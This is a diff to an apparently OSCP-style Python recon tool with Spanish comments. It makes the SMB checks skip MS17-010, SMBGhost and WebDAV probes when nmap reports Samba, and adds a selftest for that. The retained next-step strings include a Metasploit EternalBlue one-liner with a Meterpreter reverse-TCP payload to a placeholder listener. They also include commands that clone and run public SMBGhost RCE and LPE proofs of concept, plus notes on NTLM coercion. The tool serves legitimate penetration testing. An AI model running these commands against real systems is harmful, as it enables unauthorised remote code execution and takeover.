@@ -3215,6 +3215,20 @@ def _nxc_spider(res, nxc, ip, auth_args, shown_auth, shares, pattern=None):
             res["findings"].append(("alta", f"SMB spider '{share}': coincidencia de secreto en {h}"))
 
 
+def _is_samba(ports):
+    """¿Alguno de los puertos SMB trae 'Samba' en su 'product' (p. ej. 'Samba smbd 4',
+    confirmado contra el banner real de nmap)? Señal de ALTA confianza para saltar
+    comprobaciones que SOLO pueden aplicar al código fuente real de Windows — a
+    diferencia de `_target_is_windows` (una heurística débil usada para decidir una
+    wordlist, donde un falso negativo solo cuesta algo de ruido), aquí una detección
+    equivocada costaría un hallazgo real si de verdad fuera Windows, así que se exige
+    'samba' explícito en el banner en vez de razonar por la AUSENCIA de señales de
+    Windows (eso sí daría falsos positivos: un Windows con banner ambiguo/SMB1
+    deshabilitado no dice 'windows' en ningún sitio, pero tampoco dice 'samba').
+    Puro → testable sin red."""
+    return any("samba" in (p.get("product", "") or "").lower() for p in ports)
+
+
 def fp_smb(ip, ports, services, host, deep, base=None):
     res = _fp("smb", "SMB / RPC", [p["port"] for p in ports])
     nxc = nxc_bin()   # se necesita ya aquí: decide si el fallback de rpcclient (abajo) hace falta
@@ -3351,98 +3365,105 @@ def fp_smb(ip, ports, services, host, deep, base=None):
         #   · webdav: "WebClient Service enabled on: <host>" si el pipe 'DAV RPC Service' existe en
         #     IPC$ (indica el servicio WebClient activo) — vector de coacción NTLM alternativo al
         #     spooler/EFSR (ver fp_msrpc): fuerza al equipo a autenticarse por HTTP en vez de SMB.
-        rc, out17 = _run_capture_retry([nxc, "smb", ip, "-u", "", "-p", "", "-M", "ms17-010"], timeout=60)
-        vuln17 = "VULNERABLE to MS17-010" in (out17 or "")
-        # DoublePulsar poco fiable upstream: nxc construye esa línea con key.decode() sobre un int
-        # (AttributeError), así que puede NO imprimirse o salir dentro de un traceback — se exige que
-        # NO venga de un crash para no flipar el 'YA INFECTADO' por un error de nxc (#24).
-        dpulsar = ("INFECTED with DoublePulsar" in (out17 or "")
-                   and "Traceback" not in (out17 or "") and "AttributeError" not in (out17 or ""))
-        _step(res, f"{nxc} smb {ip} -u '' -p '' -M ms17-010", vuln17, out17,
-              note="CVE-2017-0143/0144/0145/0146/0147/0148 (EternalBlue): ¿es vulnerable a RCE sin autenticar? Comprobación de solo lectura, SIN credenciales")
-        if vuln17:
-            res["findings"].append(("critica",
-                "SMB: EternalBlue (MS17-010, CVSS 8.1-9.3 según variante) — VULNERABLE (comprobado, sin "
-                "credenciales): RCE como SYSTEM sin autenticar" + (" — y YA INFECTADO con DoublePulsar" if dpulsar else "")))
-            res["next"].append(
-                f"msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {ip}; "
-                "set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST TU_IP; run'   # confirmado "
-                "VULNERABLE arriba — paso MANUAL, RCE sin autenticar; revisa la arquitectura/build exacta "
-                "primero (el exploit varía por versión de Windows)")
+        if not _is_samba(ports):
+            rc, out17 = _run_capture_retry([nxc, "smb", ip, "-u", "", "-p", "", "-M", "ms17-010"], timeout=60)
+            vuln17 = "VULNERABLE to MS17-010" in (out17 or "")
+            # DoublePulsar poco fiable upstream: nxc construye esa línea con key.decode() sobre un int
+            # (AttributeError), así que puede NO imprimirse o salir dentro de un traceback — se exige que
+            # NO venga de un crash para no flipar el 'YA INFECTADO' por un error de nxc (#24).
+            dpulsar = ("INFECTED with DoublePulsar" in (out17 or "")
+                       and "Traceback" not in (out17 or "") and "AttributeError" not in (out17 or ""))
+            _step(res, f"{nxc} smb {ip} -u '' -p '' -M ms17-010", vuln17, out17,
+                  note="CVE-2017-0143/0144/0145/0146/0147/0148 (EternalBlue): ¿es vulnerable a RCE sin autenticar? Comprobación de solo lectura, SIN credenciales")
+            if vuln17:
+                res["findings"].append(("critica",
+                    "SMB: EternalBlue (MS17-010, CVSS 8.1-9.3 según variante) — VULNERABLE (comprobado, sin "
+                    "credenciales): RCE como SYSTEM sin autenticar" + (" — y YA INFECTADO con DoublePulsar" if dpulsar else "")))
+                res["next"].append(
+                    f"msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {ip}; "
+                    "set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST TU_IP; run'   # confirmado "
+                    "VULNERABLE arriba — paso MANUAL, RCE sin autenticar; revisa la arquitectura/build exacta "
+                    "primero (el exploit varía por versión de Windows)")
 
-        # OJO: smbghost/webdav NO van por _run_capture_retry — solo imprimen salida cuando SÍ hay
-        # hallazgo (smbghost: "Potentially vulnerable…" o nada; webdav: "WebClient Service…" o nada),
-        # así que la salida vacía es un resultado VÁLIDO ("no vulnerable"), no un blip que reintentar.
-        rc, outgh = run_capture([nxc, "smb", ip, "-u", "", "-p", "", "-M", "smbghost"], timeout=30)
-        vulngh = "Potentially vulnerable to SMBGhost" in (outgh or "")
-        _step(res, f"{nxc} smb {ip} -u '' -p '' -M smbghost", vulngh, outgh,
-              note="CVE-2020-0796 (SMBGhost): ¿dialecto SMB 3.1.1 con compresión activada? Comprobación de solo lectura, SIN credenciales")
-        if vulngh:
-            # BUG real corregido aquí (operador real: build 20348 = Server 2022 mostró el mismo
-            # "Potentially vulnerable" de nxc, pero el PoC real de RCE (chompie1337) falló limpio
-            # con "physical read primitive failed" — el target NO era vulnerable de verdad). El
-            # check de nxc (y el scanner de ly4k) solo confirma dialecto SMB 3.1.1 + compresión
-            # activada — una PRECONDICIÓN necesaria pero NO suficiente (su propio README lo dice:
-            # "checks for SMB dialect 3.1.1 and compression capability"), no que el código
-            # vulnerable de srv2.sys siga sin parchear. CVE-2020-0796 solo afectó oficialmente a
-            # build 18362/18363 (Windows 10 y Server, ambos 1903/1909) — cualquier otro build
-            # (más antiguo o más moderno, parcheado desde marzo de 2020) sigue anunciando
-            # compresión por protocolo sin tener el hueco de memoria que el PoC necesita. Con el
-            # build detectado (rdp-ntlm-info/smb-os-discovery, ver _detect_win_build) FUERA de ese
-            # rango, se baja la severidad y se avisa explícitamente en vez de dar "CVSS 10.0" por
-            # sentado.
-            _wbuild = _detect_win_build(services, host)
-            _ghost_vulnerable_build = _wbuild is None or _wbuild in (18362, 18363)
-            if _ghost_vulnerable_build:
-                _ghost_txt = (
-                    "SMB: SMBGhost (CVE-2020-0796, CVSS 10.0 — el máximo posible) — POTENCIALMENTE VULNERABLE "
-                    "(dialecto 3.1.1 + compresión activada, comprobado sin credenciales): RCE sin autenticar "
-                    "(wormable) o LPE local")
-                res["findings"].append(("critica", _ghost_txt))
-            else:
-                _ghost_txt = (
-                    f"SMB: SMBGhost (CVE-2020-0796) — dialecto 3.1.1 + compresión activada (precondición del "
-                    f"check), pero el build detectado ({_wbuild}) está FUERA del único rango realmente "
-                    "vulnerable (18362/18363, Windows 10 y Server 1903/1909) — casi seguro NO explotable de "
-                    "verdad pese al aviso de nxc; confírmalo con el PoC real antes de darlo por crítico")
-                res["findings"].append(("media", _ghost_txt))
-            # Bug real reportado (operador): el quick win de este hallazgo enseñaba un 'nxc smb
-            # --users --groups --pass-pol --rid-brute' sin relación, porque el CVE del hallazgo
-            # (CVE-2020-0796) no aparecía en el texto del propio next-step de abajo — el
-            # emparejado por CVE de _cmds_for fallaba y caía al heurístico genérico de "primeros N
-            # del footprint", que mezclaba next-steps de OTROS hallazgos (ver _cmds_for). Con
-            # _attach_cmd, quick_wins usa SIEMPRE estos comandos, nunca el heurístico.
-            # Segundo bug real corregido aquí: ly4k/SMBGhost (confirmado leyendo su repo real) es
-            # SOLO el scanner (scanner.py + un .pcap de ejemplo) — NO trae 'checker.py' ni ningún
-            # PoC de LPE/RCE como afirmaba este texto antes, así que el informe nunca decía qué
-            # hacer DESPUÉS de confirmar "vulnerable" (reportado en vivo: "no dice que hacer
-            # despues si es vulnerable"). Los PoCs reales (confirmados leyendo cada repo, no
-            # adivinados): RCE sin autenticar → chompie1337/SMBGhost_RCE_Poc (el propio autor
-            # avisa en su README: "a veces hace BSOD", pensado solo como demostración, nada
-            # fiable); LPE local (SYSTEM) → danigargu/CVE-2020-0796 (proyecto de Visual Studio:
-            # hace falta YA tener ejecución en el Windows para compilarlo ahí, no es un script
-            # que se lance en remoto desde Linux).
-            _attach_cmd(res, _ghost_txt, [
-                f"git clone https://github.com/ly4k/SMBGhost && python3 SMBGhost/scanner.py {ip}   "
-                "# confirma antes de explotar (repo de SOLO el scanner, sin PoC); paso MANUAL",
-                "git clone https://github.com/chompie1337/SMBGhost_RCE_Poc && cd SMBGhost_RCE_Poc && "
-                f"python3 exploit.py -ip {ip}   # RCE sin autenticar — PoC de demostración del propio "
-                "autor ('a veces hace BSOD', nada fiable): rellena USER_PAYLOAD en exploit.py (máx 600 "
-                "bytes) antes de lanzarlo",
-                "git clone https://github.com/danigargu/CVE-2020-0796   # LPE local a SYSTEM — necesitas YA "
-                "tener ejecución en el Windows: compílalo ahí (proyecto de Visual Studio, cve-2020-0796-local.sln)",
-            ])
+            # OJO: smbghost/webdav NO van por _run_capture_retry — solo imprimen salida cuando SÍ hay
+            # hallazgo (smbghost: "Potentially vulnerable…" o nada; webdav: "WebClient Service…" o nada),
+            # así que la salida vacía es un resultado VÁLIDO ("no vulnerable"), no un blip que reintentar.
+            rc, outgh = run_capture([nxc, "smb", ip, "-u", "", "-p", "", "-M", "smbghost"], timeout=30)
+            vulngh = "Potentially vulnerable to SMBGhost" in (outgh or "")
+            _step(res, f"{nxc} smb {ip} -u '' -p '' -M smbghost", vulngh, outgh,
+                  note="CVE-2020-0796 (SMBGhost): ¿dialecto SMB 3.1.1 con compresión activada? Comprobación de solo lectura, SIN credenciales")
+            if vulngh:
+                # BUG real corregido aquí (operador real: build 20348 = Server 2022 mostró el mismo
+                # "Potentially vulnerable" de nxc, pero el PoC real de RCE (chompie1337) falló limpio
+                # con "physical read primitive failed" — el target NO era vulnerable de verdad). El
+                # check de nxc (y el scanner de ly4k) solo confirma dialecto SMB 3.1.1 + compresión
+                # activada — una PRECONDICIÓN necesaria pero NO suficiente (su propio README lo dice:
+                # "checks for SMB dialect 3.1.1 and compression capability"), no que el código
+                # vulnerable de srv2.sys siga sin parchear. CVE-2020-0796 solo afectó oficialmente a
+                # build 18362/18363 (Windows 10 y Server, ambos 1903/1909) — cualquier otro build
+                # (más antiguo o más moderno, parcheado desde marzo de 2020) sigue anunciando
+                # compresión por protocolo sin tener el hueco de memoria que el PoC necesita. Con el
+                # build detectado (rdp-ntlm-info/smb-os-discovery, ver _detect_win_build) FUERA de ese
+                # rango, se baja la severidad y se avisa explícitamente en vez de dar "CVSS 10.0" por
+                # sentado.
+                _wbuild = _detect_win_build(services, host)
+                _ghost_vulnerable_build = _wbuild is None or _wbuild in (18362, 18363)
+                if _ghost_vulnerable_build:
+                    _ghost_txt = (
+                        "SMB: SMBGhost (CVE-2020-0796, CVSS 10.0 — el máximo posible) — POTENCIALMENTE VULNERABLE "
+                        "(dialecto 3.1.1 + compresión activada, comprobado sin credenciales): RCE sin autenticar "
+                        "(wormable) o LPE local")
+                    res["findings"].append(("critica", _ghost_txt))
+                else:
+                    _ghost_txt = (
+                        f"SMB: SMBGhost (CVE-2020-0796) — dialecto 3.1.1 + compresión activada (precondición del "
+                        f"check), pero el build detectado ({_wbuild}) está FUERA del único rango realmente "
+                        "vulnerable (18362/18363, Windows 10 y Server 1903/1909) — casi seguro NO explotable de "
+                        "verdad pese al aviso de nxc; confírmalo con el PoC real antes de darlo por crítico")
+                    res["findings"].append(("media", _ghost_txt))
+                # Bug real reportado (operador): el quick win de este hallazgo enseñaba un 'nxc smb
+                # --users --groups --pass-pol --rid-brute' sin relación, porque el CVE del hallazgo
+                # (CVE-2020-0796) no aparecía en el texto del propio next-step de abajo — el
+                # emparejado por CVE de _cmds_for fallaba y caía al heurístico genérico de "primeros N
+                # del footprint", que mezclaba next-steps de OTROS hallazgos (ver _cmds_for). Con
+                # _attach_cmd, quick_wins usa SIEMPRE estos comandos, nunca el heurístico.
+                # Segundo bug real corregido aquí: ly4k/SMBGhost (confirmado leyendo su repo real) es
+                # SOLO el scanner (scanner.py + un .pcap de ejemplo) — NO trae 'checker.py' ni ningún
+                # PoC de LPE/RCE como afirmaba este texto antes, así que el informe nunca decía qué
+                # hacer DESPUÉS de confirmar "vulnerable" (reportado en vivo: "no dice que hacer
+                # despues si es vulnerable"). Los PoCs reales (confirmados leyendo cada repo, no
+                # adivinados): RCE sin autenticar → chompie1337/SMBGhost_RCE_Poc (el propio autor
+                # avisa en su README: "a veces hace BSOD", pensado solo como demostración, nada
+                # fiable); LPE local (SYSTEM) → danigargu/CVE-2020-0796 (proyecto de Visual Studio:
+                # hace falta YA tener ejecución en el Windows para compilarlo ahí, no es un script
+                # que se lance en remoto desde Linux).
+                _attach_cmd(res, _ghost_txt, [
+                    f"git clone https://github.com/ly4k/SMBGhost && python3 SMBGhost/scanner.py {ip}   "
+                    "# confirma antes de explotar (repo de SOLO el scanner, sin PoC); paso MANUAL",
+                    "git clone https://github.com/chompie1337/SMBGhost_RCE_Poc && cd SMBGhost_RCE_Poc && "
+                    f"python3 exploit.py -ip {ip}   # RCE sin autenticar — PoC de demostración del propio "
+                    "autor ('a veces hace BSOD', nada fiable): rellena USER_PAYLOAD en exploit.py (máx 600 "
+                    "bytes) antes de lanzarlo",
+                    "git clone https://github.com/danigargu/CVE-2020-0796   # LPE local a SYSTEM — necesitas YA "
+                    "tener ejecución en el Windows: compílalo ahí (proyecto de Visual Studio, cve-2020-0796-local.sln)",
+                ])
 
-        rc, outwd = run_capture([nxc, "smb", ip, "-u", "", "-p", "", "-M", "webdav"], timeout=30)
-        webdav_on = "WebClient Service enabled on" in (outwd or "")
-        _step(res, f"{nxc} smb {ip} -u '' -p '' -M webdav", webdav_on, outwd,
-              note="¿está el servicio WebClient (cliente WebDAV) activo? Vector de coacción NTLM alternativo "
-                   "al spooler/EFSR: fuerza al equipo a autenticarse por HTTP en vez de SMB")
-        if webdav_on:
-            res["findings"].append(("media",
-                "SMB: servicio WebClient (WebDAV) activo — superficie de coacción NTLM alternativa: "
-                "'coercer coerce' con un listener HTTP (no SMB) puede forzar al equipo a autenticarse "
-                "contra un servidor WebDAV propio, sin depender del spooler ni de MS-EFSR"))
+            rc, outwd = run_capture([nxc, "smb", ip, "-u", "", "-p", "", "-M", "webdav"], timeout=30)
+            webdav_on = "WebClient Service enabled on" in (outwd or "")
+            _step(res, f"{nxc} smb {ip} -u '' -p '' -M webdav", webdav_on, outwd,
+                  note="¿está el servicio WebClient (cliente WebDAV) activo? Vector de coacción NTLM alternativo "
+                       "al spooler/EFSR: fuerza al equipo a autenticarse por HTTP en vez de SMB")
+            if webdav_on:
+                res["findings"].append(("media",
+                    "SMB: servicio WebClient (WebDAV) activo — superficie de coacción NTLM alternativa: "
+                    "'coercer coerce' con un listener HTTP (no SMB) puede forzar al equipo a autenticarse "
+                    "contra un servidor WebDAV propio, sin depender del spooler ni de MS-EFSR"))
+        else:
+            res["findings"].append(("info",
+                "SMB: Samba detectado (banner 'Samba smbd') — me salto ms17-010/SMBGhost/webdav: son "
+                "bugs del propio código fuente de Windows (srv.sys/srv2.sys) y del servicio WebClient, "
+                "ninguno de los dos existe en Samba (reimplementación completa del protocolo, no "
+                "comparte código con el Windows real)"))
         # ── Lote SMB-anon (OSCP-safe, SIN credenciales, RPC anónimo): recon ADCS + ioxid ──
         # enum_ca: RPC anónimo a MS-ICPR para enumerar Certificate Authorities (precondición
         # de AD CS / ESC1-8) — confirmado en nxc/modules/enum_ca.py.
@@ -14640,6 +14661,28 @@ def selftest():
         globals()["nxc_bin"], globals()["run_capture"] = _real_nxcbin_v, _real_rc_v
     assert not any("EternalBlue" in t or "SMBGhost" in t or "WebClient" in t for _s, t in _novres["findings"])
     assert any(s == "info" and "Windows build 17763" in t for s, t in _wbres["findings"]), _wbres["findings"]
+
+    # _is_samba / Samba detectado → ms17-010/SMBGhost/webdav NUNCA se lanzan (operator-reported,
+    # escaneo real contra un Debian con Samba: "ha tirado webdav y cosas de windows... sabiendo al
+    # 100 por 100 que es un debian?") — los tres son bugs/servicios exclusivos del código fuente
+    # real de Windows (srv.sys/srv2.sys/WebClient), que Samba ni comparte ni implementa, así que
+    # lanzarlos contra un 'Samba smbd' confirmado por nmap solo desperdicia tiempo. Se mockea
+    # run_capture para FALLAR el test si de verdad se llama con -M ms17-010/smbghost/webdav.
+    assert _is_samba([{"port": 445, "product": "Samba smbd 4"}]) is True
+    assert _is_samba([{"port": 445, "product": "Microsoft Windows 10 microsoft-ds"}]) is False
+    assert _is_samba([{"port": 445}]) is False   # sin 'product' (igual que el resto de selftest): no revienta
+
+    def _fail_if_windows_only_module(cmd, timeout=None, **kw):
+        if "-M" in cmd and any(m in cmd for m in ("ms17-010", "smbghost", "webdav")):
+            raise AssertionError(f"ms17-010/smbghost/webdav NUNCA deben lanzarse contra Samba: {cmd}")
+        return 0, ""
+    globals()["nxc_bin"], globals()["run_capture"] = (lambda: "FAKE_NXC"), _fail_if_windows_only_module
+    try:
+        _sambares = fp_smb("10.0.0.1", [{"port": 445, "product": "Samba smbd 4"}],
+                           [{"port": 445, "product": "Samba smbd 4", "name": "smb", "scripts": {}}], {}, False)
+    finally:
+        globals()["nxc_bin"], globals()["run_capture"] = _real_nxcbin_v, _real_rc_v
+    assert any(s == "info" and "Samba detectado" in t for s, t in _sambares["findings"]), _sambares["findings"]
 
     # ── Resultados parciales por timeout presentados como completos (complaint #2) ───────────────
     # #23: la sonda de Zerologon de fp_smb usa _run_capture_retry — una PRIMERA salida vacía (blip
